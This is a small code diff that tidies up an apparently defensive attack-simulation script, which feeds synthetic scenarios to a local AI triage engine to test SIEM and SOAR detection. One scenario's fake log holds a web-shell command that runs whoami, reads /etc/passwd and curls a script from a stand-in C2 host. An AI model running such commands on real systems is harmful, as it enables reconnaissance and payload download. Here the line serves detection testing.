@@ -7,11 +7,10 @@ and verifies SIEM detection, SOAR enrichment, and AI triage across the lab.
 """
 
 import argparse
-import json
 import socket
-import sys
 import time
 from datetime import datetime, timezone
+
 import httpx
 
 AI_ENGINE_DEFAULT = "http://localhost:8888"
@@ -92,7 +91,7 @@ ATTACK_SCENARIOS = {
         "hostname": "app-portal-02",
         "raw_log": (
             "apache2[4512]: [core:notice] mod_php: command execution detected via /uploads/shell.php "
-            "parent=apache2 child=/bin/bash cmd=\"whoami; cat /etc/passwd; curl http://c2.evil/agent.sh\""
+            'parent=apache2 child=/bin/bash cmd="whoami; cat /etc/passwd; curl http://c2.evil/agent.sh"'
         ),
         "misp_context": {
             "found": True,
@@ -206,9 +205,9 @@ def send_to_ai_engine(scenario_key: str, engine_url: str):
             print(f"    Severity      : {res['severity_normalized']}")
             print(f"    MITRE Tactic  : {res['mitre_tactic']}")
             print(f"    MITRE Technique: {res['mitre_technique']}")
-            print(f"\n[*] Incident Summary:")
+            print("\n[*] Incident Summary:")
             print(f"    {res['summary']}")
-            print(f"\n[*] Response Recommendation:")
+            print("\n[*] Response Recommendation:")
             print(f"    {res['response_recommendation']}")
             print("\n[*] Dynamic Playbook Steps:")
             for idx, step in enumerate(res.get("playbook_steps", []), 1):
